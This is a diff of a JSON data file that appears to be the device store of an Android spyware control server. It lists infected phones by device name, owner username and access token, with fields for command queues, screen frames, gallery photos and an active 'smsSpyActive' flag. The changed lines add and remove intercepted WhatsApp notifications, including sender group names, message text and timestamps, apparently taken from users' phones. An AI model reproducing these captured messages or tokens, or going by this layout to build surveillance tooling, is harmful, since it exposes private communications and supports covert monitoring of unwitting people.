@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776779320730,
+    "lastSeen": 1776779350780,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,38 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3632 pesan dari 22 chat",
+        "time": "21/04 20:49",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776779352028
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (124 pesan): ~ BASS STR",
+        "content": "📷 MINAT PM BUAT OPEN OWN DAN PT",
+        "time": "21/04 20:49",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776779351981
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3631 pesan dari 22 chat",
+        "time": "21/04 20:48",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776779322390
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎JB1 ALDY BANYUMAS JATENG (54 pesan): ~ FANZZ 𝐂𝐀𝐒𝐓𝐔𝐒||C9||ROR",
+        "content": "inpo nokos",
+        "time": "21/04 20:48",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776779322290
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (123 pesan): ~ FADLY STORE",
@@ -10296,38 +10328,6 @@
         "time": "21/04 20:21",
         "pkg": "com.whatsapp",
         "receivedAt": 1776777661975
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (100 pesan): ~ BASS STR",
-        "content": "📷 SS DONE POLOSAN SG LUMUT SOLD 65K",
-        "time": "21/04 20:21",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776777661173
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3530 pesan dari 22 chat",
-        "time": "21/04 20:20",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776777655070
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GB ZUNZ PEKALONGAN (961 pesan): ~ RIDEXY BUSINESS ALLSTORE ADMIN FULL BERIDENTITAS SELAIN [8745] CLONE.",
-        "content": "📷 polosan mete take sebind (sepaket) op?30k",
-        "time": "21/04 20:20",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776777654934
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3529 pesan dari 22 chat",
-        "time": "21/04 20:20",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776777615701
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776779319993,
+    "lastSeen": 1776779350115,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776779320086,
+    "lastSeen": 1776779350115,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
